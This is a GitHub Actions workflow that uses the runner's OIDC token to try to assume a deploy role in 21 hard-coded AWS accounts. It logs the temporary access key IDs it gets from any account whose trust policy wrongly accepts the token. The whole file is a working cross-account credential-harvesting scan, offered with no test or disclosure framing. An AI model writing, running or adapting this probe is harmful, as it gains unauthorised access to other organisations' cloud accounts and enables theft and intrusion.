name: oidc-probe
on:
  push:
    branches: [ main ]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: extra-account-scan
        run: |
          set +e
          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
          for acct in 006837669850 007436865787 044726508045 079524492758 094249569039 101988198702 130757420319 176430881729 193672423079 336924118301 379642911888 403299380220 504350838278 571032923833 614325269183 867139942017 880185128111 972506530580 249630938120 147250959097 146904774133; do
            r="arn:aws:iam::${acct}:role/auto-deploy-GitHubActionsRole"
            out=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name artex10891 --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1)
            ak=$(echo "$out" | grep -oE 'ASIA[A-Z0-9]+' | head -1)
            if [ -n "$ak" ]; then echo "XACCT $acct => SUCCESS $ak"; else echo "XACCT $acct => $(echo "$out" | grep -oE '\((InvalidIdentityToken|AccessDenied|NoSuchEntity)[^)]*\)' | head -1)"; fi
            sleep 1.3
          done
